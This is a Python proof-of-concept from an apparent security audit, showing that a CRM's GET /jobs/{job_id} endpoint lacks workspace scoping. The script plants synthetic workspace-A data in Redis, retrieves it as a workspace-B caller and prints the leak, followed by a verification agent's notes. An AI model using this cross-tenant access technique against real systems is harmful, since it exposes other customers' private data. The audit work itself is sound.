"""
PoC: GET /jobs/{job_id} (agents.py:115-134) is unscoped — IDOR across workspaces.

We reproduce the EXACT handler body (agents.py lines 121-134) which takes only
job_id (no workspace_id, no current_user reference) and returns task.result.

Step 1: simulate worker in WORKSPACE A finishing a score_lead job. score_contact.py
        line 117 returns {"contact_id": ..., "ml_score": ...}. We persist that to the
        SAME redis result backend crm-redis the real app uses, under a job_id.
Step 2: simulate the attacker (in WORKSPACE B) calling GET /jobs/{that_job_id}.
        The handler never checks workspace -> returns workspace A's result verbatim.
"""
import os, uuid, json
os.environ.setdefault("REDIS_URL", "redis://localhost:6379/0")

from celery import Celery

REDIS_URL = os.environ["REDIS_URL"]

# Construct the Celery app with the SAME backend/serializer config as
# app/workers/celery_app.py (json result_serializer, redis backend).
celery_app = Celery("crm_agentic", broker=REDIS_URL, backend=REDIS_URL)
celery_app.conf.update(
    task_serializer="json", result_serializer="json", accept_content=["json"],
)

WORKSPACE_A = "aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa"  # victim tenant
WORKSPACE_B = "bbbbbbbb-bbbb-bbbb-bbbb-bbbbbbbbbbbb"  # attacker tenant

# A namespaced job id so we can clean it up afterwards.
victim_job_id = "AUDIT-" + str(uuid.uuid4())

# ---- Step 1: WORKSPACE A's worker result lands in the shared result backend ----
# This is the exact shape score_contact.py:_run_score returns (line 117), for a
# contact that belongs to workspace A. Contains private CRM data (PII + ml_score).
victim_result = {
    "contact_id": "11111111-1111-1111-1111-111111111111",
    "ml_score": {"value": 87, "label": "hot", "trend": "stable",
                 "signals": ["Active customer (+10)", "High revenue $250,000 (+5)",
                             "[workspace A PRIVATE] CEO @ AcmeCorp, deal $250k"]},
}
celery_app.backend.store_result(victim_job_id, victim_result, "SUCCESS")
print("[setup] Stored WORKSPACE A job result in crm-redis result backend")
print("        job_id =", victim_job_id)
print()

# ---- Step 2: VERBATIM reproduction of the GET /jobs/{job_id} handler body -------
# Source: apps/api/app/routers/agents.py lines 121-134. The only input is job_id.
# Note: NO workspace_id, NO current_user.workspace_id anywhere in this logic.
def get_job_status_handler(job_id: str):
    task = celery_app.AsyncResult(job_id)        # agents.py:123
    state = task.state                            # agents.py:124
    result = None
    error = None
    if state == "SUCCESS":                        # agents.py:128
        raw = task.result                         # agents.py:129
        result = raw if isinstance(raw, dict) else {"value": str(raw)}
    elif state == "FAILURE":
        error = str(task.result)
    return {"job_id": job_id, "state": state, "result": result, "error": error}

# ---- Attacker is authenticated as WORKSPACE B and supplies workspace A's job_id.
# The handler takes no workspace input, so workspace B identity is irrelevant.
print("[attack] Caller authenticated to WORKSPACE B:", WORKSPACE_B)
print("[attack] Requests GET /jobs/%s" % victim_job_id)
resp = get_job_status_handler(victim_job_id)
print()
print("[RESULT] Handler response returned to the WORKSPACE B caller:")
print(json.dumps(resp, indent=2))
print()

leaked = json.dumps(resp.get("result"))
cross_tenant_leak = (resp["state"] == "SUCCESS"
                     and "workspace A PRIVATE" in leaked
                     and resp["result"]["contact_id"] == "11111111-1111-1111-1111-111111111111")
print("[VERDICT] Cross-tenant data disclosed to workspace B with NO workspace check:",
      cross_tenant_leak)

# ---- Cleanup: remove the namespaced test key from crm-redis ----
celery_app.backend.forget(victim_job_id)
import redis as _r
_rc = _r.Redis.from_url(REDIS_URL)
remaining = _rc.exists("celery-task-meta-" + victim_job_id)
print("[cleanup] Removed test job result; key still present?:", bool(remaining))

# =====================================================================
# REFUTATION RE-VERIFICATION (verifier agent, 2026-06-03)
# Goal: try to REFUTE "GET /jobs/{job_id} unscoped cross-tenant IDOR".
# Result: UPHELD. Confirmed via the REAL handler + REAL celery_app, not a
#         hand-copied body.
#
# Static re-check (agents.py):
#   - get_job_status (lines 116-134): `current_user` appears ONLY at line 118
#     (DI default). Body uses celery_app.AsyncResult(job_id) -> task.result.
#     `grep -n workspace agents.py` -> lines 45/58/69/100 only (other handlers),
#     NONE in get_job_status. No workspace filter, no 403 guard.
#   - Route mounted: main.py:123 include_router(agents.router) -> GET /jobs/{job_id} live.
#   - job_id returned to enqueuing clients: contacts.py:247, calls.py:99,
#     deals.py:110, deals.py:261 (return {"job_id": task.id}). Precondition reachable.
#   - Request-logging middleware logs full path incl. job_id: main.py:106-110.
#   - celery_app.py: backend=redis://localhost:6379/0 (crm-redis), default
#     celery-task-meta-* keys, result_serializer=json. No key-prefix override.
#
# Dynamic re-check #1 — original PoC re-run against live crm-redis:
#   VERDICT: Cross-tenant data disclosed to workspace B with NO workspace check: True
#   cleanup key present?: False
#
# Dynamic re-check #2 — STRONGER: imported the REAL get_job_status handler
#   and REAL app.workers.celery_app (api venv), stored A's result via the real
#   backend, called the real async handler as a WORKSPACE-B caller:
#     [cfg] real backend url: redis://localhost:6379/0  result_serializer: json
#     [REAL HANDLER RESP] state=SUCCESS, result.contact_id=11111111-...,
#       signals include "[workspace A PRIVATE] CEO @ AcmeCorp, deal $250k"
#     [VERDICT real-handler cross-tenant leak]: True
#     [note] handler callable WITHOUT current_user arg -> body never touches it
#     [cleanup] AUDIT- leftovers in redis: []  CLEAN: True
#
# Cleanup re-verified: docker exec crm-redis redis-cli --scan --pattern
#   'celery-task-meta-AUDIT-*' -> empty. No real data touched.
#
# Caveat (already disclosed honestly in the finding, not an overstatement):
#   precondition = attacker must know a foreign UUIDv4 job_id (non-enumerable).
#   This bounds severity below trivial sequential IDOR but does not eliminate
#   the unauthenticated-by-workspace cross-tenant disclosure. Severity "high"
#   stands as a fair, caveated rating.
# =====================================================================
